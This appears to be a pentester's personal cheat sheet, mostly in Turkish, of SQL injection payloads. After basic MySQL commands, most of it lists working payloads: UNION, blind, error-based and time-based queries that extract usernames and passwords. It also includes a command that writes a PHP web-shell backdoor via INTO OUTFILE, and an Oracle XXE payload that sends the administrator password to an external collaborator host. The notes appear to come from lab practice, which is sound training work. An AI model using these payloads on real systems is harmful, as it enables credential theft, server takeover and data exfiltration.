---
title: SQL Notes for Pentest
published: true
---

I save my sql notes here for easy access when needed. I will not describe the sql injection vulnerability here. I only save my notes that I use while doing pentest. 
If you want to know about sql injection vulnerability, check [here](https://portswigger.net/web-security/sql-injection/).

### [](#header-3)Data Types

*    INT: for integer data.
*    DECIMAL: for decimal data.
*    BOOLEAN: for boolean data.
*    CHAR: for fixed-length string.
*    VARCHAR: for variable-length string.
*    TEXT: for long-form text.
*    DATE: for date data.
*    TIME: for time data.
*    DATETIME: for date-time data.
*    TIMESTAMP: for timestamp data.

### [](#header-3)Simple MySQL Commands

```
CREATE DATABASE veritabani_adi;

CREATE TABLE customers (
  id INT AUTO_INCREMENT PRIMARY KEY,
  name VARCHAR(50),
  email VARCHAR(50),
  age INT
);

DROP TABLE IF EXISTS customers;

RENAME TABLE customers TO clients;

INSERT INTO customers (name, email, age) VALUES ('Alper Aktaş', 'alper@example.com', 30);

INSERT INTO employees (name, department, date) VALUES ('Alper Aktaş', 'HR', CURRENT_TIMESTAMP());

UPDATE customers SET email = 'newemail@example.com', age = 35 WHERE id = 1;

SELECT DISTINCT column_name FROM table_name; # distinct returns unique values.

ALTER TABLE employees ADD age INT;

ALTER TABLE table_name DROP COLUMN column_name;

ALTER TABLE employees CHANGE COLUMN department department_name VARCHAR(50);

SELECT column_name AS given_name FROM table_name; # aliases

SELECT column_name AS alias_name FROM table_name ORDER BY column_name DESC;

SELECT name, department FROM employees WHERE age > 30;

SELECT name FROM employees WHERE name LIKE 'J_%';

SELECT name FROM employees WHERE age BETWEEN 25 AND 35;

SELECT name FROM employees WHERE department IN (SELECT department FROM departments WHERE location = 'Turkey');

SELECT email from test WHERE email REGEXP '\\b[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z0-9.-]+\\b'; -- for email

SELECT email from test WHERE email REGEXP '^([0-9]{1,3}\.){3}[0-9]{1,3}$'; -- for ip

SELECT column_name FROM table_name WHERE column_name IS NULL;

SELECT Customers.CustomerName, Orders.OrderNumber FROM Customers INNER JOIN Orders ON Customers.CustomerID = Orders.CustomerID;

SELECT CustomerID, COUNT(*) as OrderCount FROM Orders GROUP BY CustomerID;

SELECT CustomerID, SUM(OrderAmount) as TotalAmount FROM Orders GROUP BY CustomerID HAVING SUM(OrderAmount) > 1000;
```

```
2-1
2^1 -> xor
admin' or 1=1--

Not: eğer sorgu "WHERE id IN ($deger)" şeklinde ise payload = ) "UNION SELECT #" olur.
1'' -> '1''' olur. Tırnak tırnağı escape eder. Bu yöntem ile de sql olduğunu anlayabiliriz. 

SELECT * FROM products WHERE category = 'Gifts' AND released = 1
(*) payload = Gifts'--

SELECT name, description, price FROM products WHERE category = 'Gifts'
(*) payload = Accessories' UNION ALL SELECT NULL, NULL, NULL-- -> bu payload ile kaç sütun 
döndürdüğünü belirleriz. Tüm kayıtları da çeker.
(*) payload = Accessories' UNION SELECT NULL, NULL, NULL-- -> bu payload ile kaç sütun 
döndürdüğünü belirleriz.
(*) payload = Gifts' UNION SELECT 'fff','abc'-- -> bunu sonda ayrıca döndürür.
(*) payload = Gifts' UNION SELECT username,password from users--
(*) payload = Gifts' UNION SELECT NULL,username||'~'||password from users--   
(*) payload = Lifestyle' UNION SELECT NULL, VERSION()--
(*) payload = Gifts' UNION SELECT NULL, BANNER from v$version--  -> oracle için oraclede
sorgular çağrılırken from kullanmak zorunlu. Daima "from dual" kullan.
(*) payload = x' UNION SELECT version(),database()-- #    -> bazı durumlarda sonra # koyman
gerekir.
(*) payload = Gifts' UNION SELECT table_name,NULL from information_schema.tables--
(*) payload = Gifts' UNION SELECT column_name,NULL from information_schema.columns WHERE 
table_name='users_phgkll'--
(*) payload = Gifts' UNION SELECT username_ogbrxq, password_ruenfl FROM users_phgkll--
(!) Not = Üstteki 3 komutun ORACLE versiyonu aşağıdaki 3 komut.
(*) payload = Pets' UNION SELECT table_name, NULL from all_tables--
(*) payload = Pets' UNION SELECT column_name, NULL from all_tab_columns WHERE 
table_name='USERS_VGEGUH'--
(*) payload = ' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF--


(?) UNION FOR ORACLE
(*) payload = Gifts' UNION SELECT '1',ora_database_name FROM dual-- -
(*) payload = Gifts' UNION SELECT '1',NAME FROM v$database-- - -> işe yaramayabilir.
(*) payload = Gifts' UNION SELECT '1',BANNER FROM v$version-- -
(*) payload = Gifts' UNION SELECT '1',table_name FROM all_tables-- - -> show all_tables
(*) payload = Accessories' UNION SELECT null,column_name from all_tab_columns 
WHERE table_name='USERS_JMNJUE'-- -  -> show column name
(*) payload = Accessories' UNION SELECT PASSWORD_LLWAPJ,USERNAME_DJSWSQ from USERS_JMNJUE-- -
-> verileri aldık


Blind sql(Geri dönüş değeri veren):
(?) Geri dönüş veren blind sql. Örneğin site ziyaretçi cookie değeri oluşturuyor ve bu 
ziyaretçi sayfaya tekrar dönüşünde Tekrardan Merhaba! yazdırıyor olsun. Buradan kontrol 
edilir. Eğer Tekrardan Merhaba yazdırıyor ise sorgu doğru olacak. grep match'e koymayı 
unutma.
(*) payload = CAvLTpeZvSkM2A8r' AND 1=1-- -> # da olabilir.
(*) payload = CAvLTpeZvSkM2A8r' AND ASCII(SUBSTRING(database(),1,1))='u'-- 
-> bu şekilde database bulunabilir(gerekli değil)
(*) payload = CAvLTpeZvSkM2A8r' AND ASCII(SUBSTRING((SELECT current_schema()),7,1))=117--
-> bu bir diğer database bulma şekli.
(*) payload = CAvLTpeZvSkM2A8r' ASCII(SUBSTRING((SELECT table_name from information_schema.tables LIMIT 1),1,1))='§A§'--
-> bu şekil tablo ismi bulunur.
(*) payload = 8Otn5KA6MxAE6kaX' AND ASCII(SUBSTRING((SELECT column_name from information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 1),1,1))='§A§'-- -   
-> şu şekil column isimleri bulunur. OFFSET 2. column ismini bulurken kullanılır.
(*) payload = 8Otn5KA6MxAE6kaX' AND ASCII(SUBSTRING((SELECT username from users LIMIT 1),3,1))='A'--
-> bu şekil username ve password'ler tespit edilir. OFFSET ile diğer kişilerin de şifresine
ulaşman gerekebilir.


(?) Geri hata veren blind sql. Örneği site ziyaretçi cookie değeri oluşturuyor ve bu
ziyaretçi sayfaya tekrar dönüşünde bu değer kontrol ediliyor olsun. Burada sorgunun doğru
yada yanlış olduğpu önemli değil. Hatalı sorgumu o önemli.
(*) payload = xyz' -> bu payload ile sql var mı kontrol edilir. Hata döndürüyor ise hata
veren blind sql var demektir.
(*) payload = xyz'||(SELECT '' FROM dual)||' -> hata vermiyor. Yani koşul sağlanırsa hata
vermeyecek. Veri tabanının oracle olduğunu da öğrenmiş olduk.
(*) payload = xyz'||(SELECT '' FROM users WHERE ROWNUM=1)||' -> tablo ismini bulduk. ROWNUM
ile birden fazla satır döndürmesini engelledik.
(*) (SELECT CASE WHEN SUBSTR(table_name,6,1)='§u§' THEN TO_CHAR(1/0) ELSE '' END FROM user_tables WHERE ROWNUM=1)||'
-> tablo adını buluruz.
(*) payload = xyz'||(SELECT CASE WHEN SUBSTR(column_name,7,1)='§u§' THEN TO_CHAR(1/0) ELSE '' END FROM all_tab_columns WHERE ROWNUM=1 AND table_name='USERS')||'
-> column ismini buluyoruz.
(*) payload = xyz'||(SELECT CASE WHEN SUBSTR(username,1,1)='§u§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1)||'
-> verileri bulup çıkarmaya başlıyoruz
--Bunlara Ek Olarak--
(*) payload = xyz'||(SELECT CASE WHEN LENGTH(password)>19 THEN to_char(1/0) ELSE '' END 
FROM users WHERE username='administrator')||'   -> şifre uzunluğunu bul.
(*) payload = xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' 
END FROM users WHERE username='administrator')||'  -> şifreyi bulmaya çalışırız.
(*) 1 AND (SELECT 1 from images LIMIT 1) -> tablo ismini bulduk.
(*) 1 AND (SELECT PATH FROM images LIMIT 1) -> sütun ismini bulduk.
(*) -9 OR (SELECT SUBSTRING(PATH,1,2) FROM images LIMIT 1)='im' -> sağ taraf true ise 1 
sonucunu verir.
locate seclists | grep param


(?) Error Based SQL(Eğer hatada sorgunun sonucu yazıyorsa işe yarar. Örnek: 
sonuç bulunamadı: my_db)
(*) payload = extractvalue(rand(), concat(1, (SELECT database()))) -> çıktıyı ekrana 
yazdıracak.
(*) payload = extractvalue(rand(), concat(1, (SELECT table_name from information_schema.tables WHERE table_schema='sql_injection' LIMIT 1)))
-> table_schema vererek sadece o database e ait tablo isimlerini getiririz. LIMIT 1 ile 1 
tane değer dönmesini istiyoruz.
(*) payload = extractvalue(rand(), concat(1, (SELECT table_name from information_schema.tables WHERE table_schema='sql_injection' LIMIT 1 OFFSET 1)))
-> Üsttekine ek olarak OFFSET 1 ilk değeri atlamasını söyler. 2,3,4 şeklinde devam edilebilr.
Eğer 1 adet değer döndürmek zorunda isek bu kullanışlıdır.
(*) payload = extractvalue(rand(), concat(1, (SELECT column_name from information_schema.columns WHERE table_name='images' LIMIT 1 OFFSET 1)))
-> column isimlerini sırayla çıkarıyoruz.
(*) payload = extractvalue(rand(), concat(1, (SELECT path from images LIMIT 1))) 
-> verileri çekiyoruz.
 

(?) Time delays blind sql. Zaman dayalı blind sql.
(*) payload = admin' AND 1=IF(1=1,sleep(5),0)--
(*) paylaod = admin' AND 1=IF(SUBSTRING((SELECT database()),1,1)='a',sleep(5),0)


(?) Time delays blind sql. Zamana dayalı blind sql.
(*) ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))asd) AND 'ayse'='ayse--
-> bu payloadı da deneyebilirsin. Aşağıdakilere ek olarak.
Not: cluster bomb u kullan ve saldırıyı başlattıktan sonra response received kısmını da gster 
(*) payload = x'||pg_sleep(10)--   -> oracle için. mysql de SELECT SLEEP(10)
(*) payload = x'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--   
-> test
(*) payload = x'||(SELECT CASE WHEN (SUBSTR(table_name,§1§,1)='§x§') THEN pg_sleep(5) ELSE pg_sleep(0) END from information_schema.tables WHERE table_schema=current_schema() LIMIT 1 OFFSET 1)--
-> bu kod ile tabloları buluruz.
(*) payload = x'||(SELECT CASE WHEN (SUBSTR(column_name,§1§,1)='§x§') THEN pg_sleep(5) ELSE pg_sleep(0) END from information_schema.columns WHERE table_schema=current_schema() AND table_name='users' LIMIT 1 OFFSET 1)--
-> bu kod ile sütun isimleri bulunur
(*) payload = x'||(SELECT CASE WHEN (SUBSTR(password,§1§,1)='§x§') THEN pg_sleep(5) ELSE pg_sleep(0) END from users LIMIT 1 OFFSET 1)-- 
-> bilgiler çıkarılır.
---AYRICA ALTTAKİLERDEN DE YARDIM ALABİLİRSİN---
(*) payload = x'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE 
pg_sleep(0) END FROM users)--
(*) x'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password) > 18) 
THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--    -> şifre uzunluğu
(*) x'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') 
THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--    -> şifre bulunur. İstekleri tek tek
göndermek için resource kısmından maximum concurrent requests kısmı 1 olarak ayarlanır.


(?) out of band sql.
(*) payload = x' INTO OUTFILE '/var/www/html/c99.php';
(*) SELECT '<?=system(@$_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/c99.php'; -> backdoor
(*) payload = mehmet' INTO OUTFILE '\\\alper.com/a'; -> dns sorgusu yapar.
(*) payload = mehmet' INTO OUTFILE '\\\'+(SELECT 'mehmet')+'alper.com/a'; 
(*) payload = x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://p6wfpi34q2x10we2un1hu6m78yeo2d.oastify.com/"> %remote;]>'),'/l') FROM dual--
-> url encode etmeyi unutma. Bu payload ile out of band sql var mı kontrol ederiz. Bu oracle
için tabi
(*) payload = x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
-> şifre kontrol.


(?) sql from xml: xml'in içindeki gerekli yere payloadı yerleştir. 
(*) payload = 1 UNION SELECT username || '~' || password FROM users
(*) payloadı seç sağ tıkla->extensions->hackvertior->encode->hex_etities ile kodla. Eğer
waf var ve isteği engelliyor ise.


---ALT KISIM GEREKSİZ OLABİLİR(üsste zaten hepsi mevcut)---


(?) SQL örnek payloadlar(union için)
(*) UNION SELECT 1,2,database()
(*) 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
(*) 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
(*) 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

(?) SQL örnek payloadlar(Boolean için)
(*) admin123' UNION SELECT 1,2,3;--    -> True verirse bulmuş oluruz.
(*) admin123' UNION SELECT 1,2,3 where database() like 's%'--   -> True sonucunu verene kadr
denemeye devam ederiz.
(*) admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'users%';--
(*) https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'password%';
(*) admin123' UNION SELECT 1,2,3 from users where username like 'a%
(*) admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%

(?) SQL örnek payloadlar(time-based için)
(*) admin123' UNION SELECT SLEEP(5),2;--   -> 2 satırlı
(*) admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--

Sql paylaod list: https://github.com/orwagodfather/WordList/blob/main/SQL.txt

Not: Bazen url deki parametrede de sql olabilir yani q=alper yerine q'=alper dene veya 
q[]=alper şeklinde dene. request methodunu değiştirerek isteği göndermeyi de dene.

(?) SQL örnek payloadlar:
(*) ?id=-1 UNION SELECT 1,@@version,database(),4,5 -- -
```









